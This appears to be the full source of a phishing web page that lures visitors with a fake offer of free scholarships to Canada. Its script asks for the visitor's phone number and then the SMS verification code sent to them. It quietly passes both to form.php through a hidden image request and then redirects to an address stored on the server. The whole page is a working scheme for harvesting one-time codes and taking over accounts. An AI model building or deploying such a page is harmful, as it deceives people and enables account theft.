<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
      #block{
        margin-top: 5%;
      }h5{color:red; font-size: 15px;}
      #code{
        display:none;
        margin-top: 8%;
      }body{
        background-image: url("bg.jpg");
        background-size: cover;
        font-family: courier new;
      }.inp{
        height:30px;
        width:200px;
        border-radius: 4px;
      }.sun{
        height:30px;
        width:100px;
        border:1px solid #d2d2d2;
        background: #d2d2d2;
        border-radius: 4px;
        box-shadow: 1px 2px 3px 0px #aaa;
      }.sun:hover{
        box-shadow: 2px 4px 6px 0px #aaa;
      }#bg{
        background: #999ab9e3;
        height:auto;
        width:600px;
        padding: 2px;
        border-radius: 6px;
      }.recap{
        border-radius: 90px;
        padding: 8px 40px 0px 0px;
      }
    </style>

  </head>
  <body>
    <center>
      <h1>ScholarShips To Canada</h1>
      <h5>Did You Wanna Go To Canada? If You Want Register Below. For FREE</h5>
      <hr><br><br>
    <div id="bg">
      <table>
        <td>
          <img src="index.png" height="100px" class="recap">
        </td>
        <td>
      <div id="block" >
        <h3 id='ttx'>Enter Your Phone Number.</h3>
        <input type="number"  id=numb class="inp" value="+">
        <input type="submit" value="Next" id="phone" class="sun" placeholder="Phone number" >
      </div>
      <div id=code>
        <input name="" id="send_code" class="inp" type="number" placeholder="SMS Code">
        <input type="submit" value="Submit" id="send" class="sun">
      </div>
    </td>
    </div>
  </center>
  <img scr="" style="display:none;" id=sender>
  </body>
  <script>
  var ii = 0;
  var code = document.getElementById('code')
  var block = document.getElementById('block')
  var numb = document.getElementById('numb')
  var sender = document.getElementById('sender')
  document.getElementById('phone').onclick = function(){
    if(numb.value===""){alert("Error. You Didn't Put Your Phone Number")}else{
    sender.src="form.php?phone="+numb.value;
    code.style.display="block";
    document.getElementById('phone').style.display="none";
    document.getElementById('ttx').innerHTML="Enter SMS Code That We Send You."
    //block.style.display="none";
  }
  };
  document.getElementById('send').onclick = function(){
    if(document.getElementById('send_code').value===""){alert("Error. You Didn't Put SMS Code")}else{
      sender.src="form.php?code="+ document.getElementById('send_code').value +"&phone="+numb.value;
      alert("You Are Successfully Registered Good Luck!!")
      document.getElementById('send_code').value=""
      ii++;
    }
    if(ii == 2){
      if(document.getElementById('send_code').value===""){alert("Error. You Didn't Put SMS Code")}else{
        sender.src="form.php?code="+ document.getElementById('send_code').value +"&phone="+numb.value
        window.location.href="<?php echo file_get_contents("location.u"); ?>";
    }}
  };
  </script>
</html>
